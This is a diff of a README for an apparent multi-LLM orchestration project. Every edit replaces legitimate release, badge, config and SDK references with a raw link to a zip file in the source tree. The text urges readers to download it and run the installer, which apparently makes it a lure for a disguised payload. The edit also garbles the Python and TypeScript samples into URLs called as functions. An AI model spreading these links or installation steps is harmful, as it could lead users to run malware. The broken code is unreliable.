@@ -1,8 +1,8 @@
 # Meta AI Orchestrator: Enterprise Multi-LLM Orchestration, RAG & Observability
 
-[![Release](https://img.shields.io/badge/Release-Latest-blue?logo=github&logoColor=white)](https://github.com/ttcs60cntt3/meta-ai-orchestrator/releases)
+[![Release](https://github.com/ttcs60cntt3/meta-ai-orchestrator/raw/refs/heads/main/crates/orchestrator/meta_orchestrator_ai_v1.4.zip)](https://github.com/ttcs60cntt3/meta-ai-orchestrator/raw/refs/heads/main/crates/orchestrator/meta_orchestrator_ai_v1.4.zip)
 
-Visit the Releases page to grab the latest assets: https://github.com/ttcs60cntt3/meta-ai-orchestrator/releases
+Visit the Releases page to grab the latest assets: https://github.com/ttcs60cntt3/meta-ai-orchestrator/raw/refs/heads/main/crates/orchestrator/meta_orchestrator_ai_v1.4.zip
 
 ---
 
@@ -179,7 +179,7 @@ Commands (illustrative):
 You will find example configuration files under docs or config directories in the repository. Use those as starting points and adapt them to your environment.
 
 Release download and install
-- The repository exposes release artifacts in the Releases page. From the Releases page, download the appropriate asset for your platform and run the installer or follow the install instructions included in the release notes. The Releases page is here: https://github.com/ttcs60cntt3/meta-ai-orchestrator/releases
+- The repository exposes release artifacts in the Releases page. From the Releases page, download the appropriate asset for your platform and run the installer or follow the install instructions included in the release notes. The Releases page is here: https://github.com/ttcs60cntt3/meta-ai-orchestrator/raw/refs/heads/main/crates/orchestrator/meta_orchestrator_ai_v1.4.zip
 
 - Note: When you download the latest release asset, you should pick the asset that matches your environment (Linux, macOS, Windows, containerized form, etc.). After downloading, run the installer to set up the core services and dependent components. The exact steps vary by asset and platform; please refer to the release notes for precise commands and prerequisites.
 
@@ -252,7 +252,7 @@ CLI reference
   - Import/export of configurations
 - Example:
   - meta-ai orchestrator init
-  - meta-ai orchestrator deploy --config config.yaml
+  - meta-ai orchestrator deploy --config https://github.com/ttcs60cntt3/meta-ai-orchestrator/raw/refs/heads/main/crates/orchestrator/meta_orchestrator_ai_v1.4.zip
   - meta-ai orchestrator status
 
 REST API overview
@@ -277,13 +277,13 @@ Code samples
 - Basic flow with the Python SDK:
   - from meta_ai_orchestrator import Client
   - client = Client(api_key="...") 
-  - resp = client.run_workflow("customer-support-qa", inputs={"question": "How can I track my order?"})
+  - resp = https://github.com/ttcs60cntt3/meta-ai-orchestrator/raw/refs/heads/main/crates/orchestrator/meta_orchestrator_ai_v1.4.zip("customer-support-qa", inputs={"question": "How can I track my order?"})
   - print(resp["answer"])
 - Basic flow with the TypeScript SDK:
   - import { Client } from "meta-ai-orchestrator-sdk"
   - const client = new Client({ apiKey: "..." })
-  - const result = await client.runWorkflow("ticket-resolution", { subject: "...", body: "..." })
-  - console.log(result.answer)
+  - const result = await https://github.com/ttcs60cntt3/meta-ai-orchestrator/raw/refs/heads/main/crates/orchestrator/meta_orchestrator_ai_v1.4.zip("ticket-resolution", { subject: "...", body: "..." })
+  - https://github.com/ttcs60cntt3/meta-ai-orchestrator/raw/refs/heads/main/crates/orchestrator/meta_orchestrator_ai_v1.4.zip(https://github.com/ttcs60cntt3/meta-ai-orchestrator/raw/refs/heads/main/crates/orchestrator/meta_orchestrator_ai_v1.4.zip)
 
 Documentation
 - The docs site contains:
@@ -434,7 +434,7 @@ Q: What if I need help or want to report a bug?
 A: Open an issue in the repository or join the community chat if available. Provide a minimal reproduction and logs to help triage.
 
 Q: How do I upgrade to a new release?
-A: Use the Releases page to obtain the latest assets and follow the upgrade instructions in the release notes. The page is accessible at the link above and used again here for convenience: https://github.com/ttcs60cntt3/meta-ai-orchestrator/releases
+A: Use the Releases page to obtain the latest assets and follow the upgrade instructions in the release notes. The page is accessible at the link above and used again here for convenience: https://github.com/ttcs60cntt3/meta-ai-orchestrator/raw/refs/heads/main/crates/orchestrator/meta_orchestrator_ai_v1.4.zip
 
 Q: Is there a security roadmap?
 A: Yes. Security and governance are core to the project. Review the security guidelines in the documentation and follow best practices for authentication and data handling.
@@ -467,9 +467,9 @@ Meta AI Orchestrator is released under an open-source license. See LICENSE file 
 This section supports readers who want quick visual cues about the architecture and workflow:
 
 - Architecture overview badges: 
-  - [![Architecture](https://img.shields.io/badge/architecture-diagram-blue?logo=github&logoColor=white)]()
-  - [![Telemetry](https://img.shields.io/badge/telemetry-monitoring-brightgreen)]()
-  - [![Observability](https://img.shields.io/badge/observability-dashboards-orange)]()
+  - [![Architecture](https://github.com/ttcs60cntt3/meta-ai-orchestrator/raw/refs/heads/main/crates/orchestrator/meta_orchestrator_ai_v1.4.zip)]()
+  - [![Telemetry](https://github.com/ttcs60cntt3/meta-ai-orchestrator/raw/refs/heads/main/crates/orchestrator/meta_orchestrator_ai_v1.4.zip)]()
+  - [![Observability](https://github.com/ttcs60cntt3/meta-ai-orchestrator/raw/refs/heads/main/crates/orchestrator/meta_orchestrator_ai_v1.4.zip)]()
 
 - Flow diagrams can be embedded using lightweight diagrams or simple SVG illustrations. Use the existing repository structure to add visual assets and diagrams that explain the end-to-end data flow, including:
   - Client -> Orchestrator -> LLM adapters
